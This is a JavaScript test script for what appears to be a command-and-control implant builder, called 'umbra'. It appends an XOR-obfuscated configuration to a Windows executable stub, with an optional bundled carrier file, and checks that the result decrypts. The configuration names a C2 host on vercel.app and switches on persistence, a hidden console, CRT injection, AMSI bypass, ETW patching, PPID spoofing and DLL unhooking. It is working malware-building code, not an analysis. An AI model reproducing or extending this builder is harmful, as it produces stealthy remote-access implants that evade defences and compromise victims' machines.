// Verify wrap: stub MZ + quoted trailer + optional carrier.
const fs = require('fs')
const path = require('path')

const CFG_MAGIC = Buffer.from([0x61, 0x72, 0x67, 0x70, 0x01, 0x70, 0x75, 0x74])
const FILE_MAGIC = Buffer.from([0x55, 0x4d, 0x42, 0x52, 0x41, 0x46, 0x31, 0x00])

function esc(s) { return JSON.stringify(s ?? '') }

function marshal(cfg) {
  const port = String(cfg.port || 443)
  const useTls = cfg.useTls || port === '443' ? 'true' : 'false'
  const json =
    `{"c2_host":${esc(cfg.host)},"c2_port":${esc(port)},"use_tls":${esc(useTls)},` +
    `"sleep_interval":${esc('15')},"jitter":${esc('20')},"persistence":${esc('true')},` +
    `"hide_console":${esc('true')},"key":${esc('')},"injection_method":${esc('crt')},` +
    `"anti_debug":${esc('false')},"anti_vm":${esc('false')},` +
    `"sleep_obfuscation":${esc('true')},"amsi_bypass":${esc('true')},"etw_patch":${esc('true')},` +
    `"ppid_spoof":${esc('true')},"dll_unhook":${esc('true')}}`
  return Buffer.from(json, 'utf8')
}

function xorBody(json) {
  const enc = Buffer.alloc(json.length)
  for (let i = 0; i < json.length; i++) enc[i] = json[i] ^ ((0x5a + (12 + i)) & 0xff)
  return enc
}

function decrypt(buf) {
  for (let off = 8; off <= Math.min(8192, buf.length); off++) {
    const i = buf.length - off
    if (i + 12 > buf.length) continue
    if (!buf.subarray(i, i + 8).equals(CFG_MAGIC)) continue
    const ln = buf.readUInt32LE(i + 8)
    if (ln <= 0 || ln > 8192 || i + 12 + ln > buf.length) continue
    const out = Buffer.alloc(ln)
    for (let j = 0; j < ln; j++) out[j] = buf[i + 12 + j] ^ ((0x5a + (12 + j)) & 0xff)
    return out.toString('utf8')
  }
  return null
}

function wrap(stub, carrier, cfg) {
  const json = marshal(cfg)
  const enc = xorBody(json)
  const parts = [stub]
  if (carrier && carrier.length) {
    const len = Buffer.alloc(4)
    len.writeUInt32LE(carrier.length)
    parts.push(FILE_MAGIC, len, carrier)
  }
  const clen = Buffer.alloc(4)
  clen.writeUInt32LE(json.length)
  parts.push(CFG_MAGIC, clen, enc)
  return { bytes: Buffer.concat(parts), json: json.toString('utf8') }
}

const stubPath = path.join(__dirname, '..', 'public', 'umbra-stub.bin')
const stub = fs.readFileSync(stubPath)
if (stub[0] !== 0x4d || stub[1] !== 0x5a) {
  console.error('FAIL stub not MZ', stub.length)
  process.exit(1)
}
const carrier = Buffer.from('MZ-fake-carrier-payload')
const { bytes, json } = wrap(stub, carrier, { host: 'chemical-umbra.vercel.app', port: 443, useTls: true })
const got = decrypt(bytes)
if (!got) { console.error('FAIL decrypt'); process.exit(1) }
if (got !== json) { console.error('FAIL mismatch', got, json); process.exit(1) }
const need = ['"c2_host":"chemical-umbra.vercel.app"', '"use_tls":"true"', '"anti_vm":"false"', '"injection_method":"crt"', '"amsi_bypass":"true"', '"dll_unhook":"true"', '"ppid_spoof":"true"', '"persistence":"true"']
for (const n of need) {
  if (!got.includes(n)) { console.error('FAIL missing', n, got); process.exit(1) }
}
const fi = bytes.indexOf(FILE_MAGIC)
if (fi < 0) { console.error('FAIL no carrier magic'); process.exit(1) }
const cl = bytes.readUInt32LE(fi + 8)
const car = bytes.subarray(fi + 12, fi + 12 + cl)
if (!car.equals(carrier)) { console.error('FAIL carrier'); process.exit(1) }
if (bytes[0] !== 0x4d) { console.error('FAIL out not MZ'); process.exit(1) }
console.log('WRAP_OK size', bytes.length, 'stub', stub.length, 'json', json.length)
